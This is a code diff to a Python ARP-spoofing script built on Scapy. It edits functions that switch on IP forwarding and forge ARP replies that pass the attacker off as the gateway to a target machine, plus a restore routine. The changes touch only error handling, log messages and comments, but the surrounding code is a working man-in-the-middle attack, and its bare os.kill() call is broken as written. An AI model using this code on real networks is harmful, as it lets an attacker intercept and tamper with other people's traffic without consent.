@@ -34,20 +34,19 @@ def restore(gateway_ip, gateway_mac, target_ip, target_mac):
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
     
     try: os.kill()
-
-    except: pass
+    except Exception as err: print("[?] ERR: %s" % err)
 
 def poison_target(gateway_ip, gateway_mac, target_ip, target_mac, interface):
     # forward ipv4 traffic
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-    print("[+] Enabled IP forwarding")
+    print("[+] Enabled IPv4 forwarding")
           
-    # (opcode = 2) = ARP REPLY
+    # (opcode = 2) = ARP REPLY, update the targets' MAC table
     poison_target = ARP()
     
     poison_target.op = 2
-    poison_target.psrc = gateway_ip
-    poison_target.pdst = target_ip
+    poison_target.psrc = gateway_ip #  this field contains the supposed IP address of the device that is sending the response
+    poison_target.pdst = target_ip  # IPv4 address of the intended receiver
     poison_target.hwdst = target_mac
 
     poison_gateway = ARP()
